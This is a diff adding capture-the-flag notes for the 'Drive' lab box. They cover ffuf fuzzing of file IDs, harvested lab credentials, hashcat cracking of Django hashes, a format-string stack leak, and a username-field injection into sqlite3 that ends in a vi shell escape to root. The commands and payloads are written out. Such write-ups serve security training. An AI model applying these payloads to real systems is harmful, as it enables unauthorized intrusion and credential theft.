@@ -1,0 +1,100 @@
+Concerning this box, we got a few ports open, we got the normal SSH and HTTP, BUT there is an interesting filtered port on 3000
+
+Running through the site there is a login that isnt injectable
+we can register an account but the password needs to meet requirements
+ender:ender12345 ==> valid
+
+Now looking at the URL when we view files they have IDs, we can try fuzzing to
+see if any other files on the site exists and if we can access their contents:
+
+`ffuf -c -request fileDetail.req -request-proto http -w /usr/share/wordlists/Seclists/Fuzzing/3-digits-000-999.txt -t 100 --fs 82 -of csv -o pubFileList`
+
+`ffuf -c -request fileDetail.req -request-proto http -w /usr/share/wordlists/Seclists/Fuzzing/3-digits-000-999.txt -t 100 --fs 82 -of csv -o fileDetail.fuff; cat fileDetail.fuff | awk -F',' '{print $3}' > pubFileList` ==> format the output so we just see what we want instead of all the extra
+
+`ffuf -c -request group.req -request-proto http -w /usr/share/wordlists/Seclists/Fuzzing/3-digits-000-999.txt -t 100 --fs 82 -of csv -o groups.fuff; cat groups.fuff | awk -F',' '{print $3}' > pubGroupList` ==> format output
+
+Main issue at this time is we cant access most of the data we found due to
+permissions, if we can escalate to an admin we should be free to dig around.
+
+http://drive.htb/FUZZ/block/ --> this allows us to view other peoples files
+
+079 --> martin:Xk4@KjyrYv8t194L! ==> SSH Cred
+
+On port 3000 --> Gitea Repo :: martin@drive.htb:Xk4@KjyrYv8t194L!
+
+We can go to the /var/www/backups and fetch a sqlite3 file that we can
+pull a bunch of user hashes.
+
+`cat hashes.sqlite3 | awk -F'|' '{print $2,":",$8}'` ==> format to show hashes with their corresponding users
+
+On the website if we mess around with it trying to leak anything kind of
+responses, along with checking out requests and noting any behaviors, we
+can deduct we are dealing with Django, along with inside the box, we can do
+`find / -name "django"` to see if the box contains any set up folders or files
+
+To extract the files from 7z we need a passcode : H@ckThisP@ssW0rDIfY0uC@n:)
+
+We want to get a file full of all the hashes we found then we want to sort them using sort -u hashs.txt, this removes dups
+then we can run: hashcat -m 124 -a 0 backupHashes.txt /usr/share/wordlists/rockyou.txt.gz --> cracks django sha1 hashes
+
+su tom --> johnmayer7 ==> Gets us User.txt tom:johnmayer7 :: SSH
+------------------- BINARY EXPLOIT ------------------------------------
+
+Running the doodlegrive-cli in ghidra after an analysis, we can find
+a hard coded cred for the binary:
+	moriarty:findMeIfY0uC@nMr.Holmz!
+	
+------------------------------------------------
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA :: 57 chars inside the password buffer causes the error `*** stack smashing detected ***: terminated`
+
+###
+%d - for printing integers
+%f - for printing floating-point numbers
+%c - for printing characters
+%s - for printing strings
+%p - for printing memory addresses
+%x - for printing hexadecimal values
+###
+
+If we input any of these % parameters the program acts funny:
+%p --> 0x10
+%x --> 10
+$s --> segmentation fault
+%d --> 16
+
+%x%x%x%x%x%x%x --> `100024baeb30137825782578257825` :: Format String Vulnerability. It causes a memory leak in the program stack.
+
+To leak specific locations of the stack, the format is %ID$p
+
+%09$p.%10$p
+%10$p.%11$p
+%11$p.%12$p
+%12$p.%13$p
+%13$p.%14$p
+%14$p.%15$p
+%15$p.%16$p
+%16$p.%17$p
+
+%15$p --> This memory location always changes (Canary)
+
+We cannot bypass the NX so we'll have to hijack the order of Execution.
+
+--------------------------- END OF BINARY EXPLOIT --------------------
+
+------- UNINTENDED SQLI + GTFOBIN --------
+Inside the source code we can see in the activate_user function
+that while root is still running sqlite3, we can inject the username input
+possibly allowing us to run sqlite3 commands like .system for RCE and etc.
+
+	moriarty:findMeIfY0uC@nMr.Holmz!
+
+'UPDATE accounts_customuser SET is_active=1 WHERE username="%s"' ==> Bin Query
+
+export VISUAL=/usr/bin/vi --> bypass the PATH="" (path clear)
+" & edit("a")-- --> opens vi
+
+:!/bin/bash --> run like :wq ==> Gets us a shell
+
+** We will need to reset the PATH to the normal linux path so we
+can move around properly **
+------------------------------------------
